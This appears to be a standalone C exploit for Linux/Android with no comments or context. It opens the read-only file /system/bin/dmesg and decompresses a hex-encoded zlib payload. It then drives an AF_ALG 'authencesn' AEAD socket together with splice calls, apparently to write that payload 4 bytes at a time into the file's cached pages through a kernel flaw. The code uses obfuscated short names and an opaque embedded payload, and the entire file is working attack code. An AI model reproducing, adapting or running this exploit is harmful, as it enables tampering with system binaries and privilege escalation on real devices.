#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/socket.h>
#include <linux/if_alg.h>
#include <sys/syscall.h>
#include <zlib.h>

#ifndef SOL_ALG
#define SOL_ALG 279
#endif

#ifndef ALG_SET_KEY
#define ALG_SET_KEY 1
#define ALG_SET_IV 2
#define ALG_SET_OP 3
#define ALG_SET_AEAD_ASSOCLEN 4
#endif

static void hex2bin(const char *hex, unsigned char *out, size_t max_len) {
    size_t len = strlen(hex);
    if (len % 2) return;
    for (size_t i = 0; i < len/2 && i < max_len; i++) {
        sscanf(hex + 2*i, "%2hhx", &out[i]);
    }
}
static unsigned char* d(const char *hex, size_t *out_len) {
    size_t hex_len = strlen(hex);
    *out_len = hex_len / 2;
    unsigned char *buf = (unsigned char*)malloc(*out_len);
    if (!buf) return NULL;
    hex2bin(hex, buf, *out_len);
    return buf;
}

static void c(int f, int t, const unsigned char *c, size_t c_len) {
    int a = socket(AF_ALG, SOCK_SEQPACKET, 0);
    if (a < 0) { perror("socket"); return; }

    struct sockaddr_alg sa = {
        .salg_family = AF_ALG,
        .salg_type = "aead",
        .salg_name = "authencesn(hmac(sha256),cbc(aes))"
    };
    if (bind(a, (struct sockaddr*)&sa, sizeof(sa)) < 0) { perror("bind"); close(a); return; }

    int h = SOL_ALG;

    size_t key_len;
    unsigned char *key_data = d("0800010000000010" "000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000", &key_len);
    if (key_data) {
        if (setsockopt(a, h, ALG_SET_KEY, key_data, key_len) < 0) perror("setsockopt KEY");
        free(key_data);
    }

    int dummy = 0;
    if (setsockopt(a, h, 5, &dummy, 4) < 0) perror("setsockopt 5");

    int u = accept(a, NULL, NULL);
    if (u < 0) { perror("accept"); close(a); return; }

    int o = t + 4;   

    unsigned char send_buf[8];
    memcpy(send_buf, "AAAA", 4);
    if (c_len >= 4) memcpy(send_buf+4, c, 4);
    else memset(send_buf+4, 0, 4);

    size_t i_len;
    unsigned char *i_zero = d("00", &i_len);

    struct msghdr msg = {0};
    struct cmsghdr *cmsg;
    char cmsg_buf[CMSG_SPACE(sizeof(__u32)) * 4];
    struct iovec iov;
    iov.iov_base = send_buf;
    iov.iov_len = 8;
    msg.msg_iov = &iov;
    msg.msg_iovlen = 1;
    msg.msg_control = cmsg_buf;
    msg.msg_controllen = sizeof(cmsg_buf);
    cmsg = CMSG_FIRSTHDR(&msg);
    cmsg->cmsg_level = h;
    cmsg->cmsg_type = 3;
    cmsg->cmsg_len = CMSG_LEN(4);
    __u32 val = 0;
    memcpy(CMSG_DATA(cmsg), &val, 4);
    cmsg = CMSG_NXTHDR(&msg, cmsg);
    cmsg->cmsg_level = h;
    cmsg->cmsg_type = 2;
    cmsg->cmsg_len = CMSG_LEN(20);
    unsigned char iv_data[20];
    iv_data[0] = 0x10;
    memset(iv_data+1, 0, 19);
    memcpy(CMSG_DATA(cmsg), iv_data, 20);
    cmsg = CMSG_NXTHDR(&msg, cmsg);
    cmsg->cmsg_level = h;
    cmsg->cmsg_type = 4;
    cmsg->cmsg_len = CMSG_LEN(4);
    unsigned char assoc_data[4] = {0x08, 0, 0, 0};
    memcpy(CMSG_DATA(cmsg), assoc_data, 4);

    
    if (sendmsg(u, &msg, 0) < 0) perror("sendmsg");

  
    int pipefd[2];
    if (pipe(pipefd) < 0) { perror("pipe"); close(u); close(a); return; }

  
    ssize_t spliced = splice(f, NULL, pipefd[1], NULL, o, SPLICE_F_MOVE);
    if (spliced != o) perror("splice f->pipe");

    spliced = splice(pipefd[0], NULL, u, NULL, o, SPLICE_F_MOVE);
    if (spliced != o) perror("splice pipe->socket");

    close(pipefd[0]);
    close(pipefd[1]);

    char recv_buf[8192];
    ssize_t recv_len = recv(u, recv_buf, 8 + t, 0);
    if (recv_len < 0) { /**/ }

    close(u);
    close(a);
    free(i_zero);
}

int main() {
    int f = open("/system/bin/dmesg", O_RDONLY);
    if (f < 0) { perror("open /system/bin/dmesg"); return 1; }

    size_t compressed_len;
    unsigned char *compressed = d("78daab77f57163626464800126063b0610af82c101cc7760c0040e0c160c301d209a154d16999e07e5c1680601086578c0f0ff864c7e568f5e5b7e10f75b9675c44c7e56c3ff593611fcacfa499979fac5190c0c0c0032c310d3", &compressed_len);
    if (!compressed) return 1;

    uLongf dest_len = 65536;
    unsigned char *decompressed = (unsigned char*)malloc(dest_len);
    if (!decompressed) { free(compressed); return 1; }

    int ret = uncompress(decompressed, &dest_len, compressed, compressed_len);
    if (ret != Z_OK) {
        fprintf(stderr, "zlib decompress error: %d\n", ret);
        free(compressed);
        free(decompressed);
        close(f);
        return 1;
    }
    free(compressed);

    unsigned char *e = decompressed;
    size_t e_len = dest_len;


    for (size_t i = 0; i + 4 <= e_len; i += 4) {
        c(f, i, e + i, 4);
    }

    free(e);
    close(f);
    return 0;
}
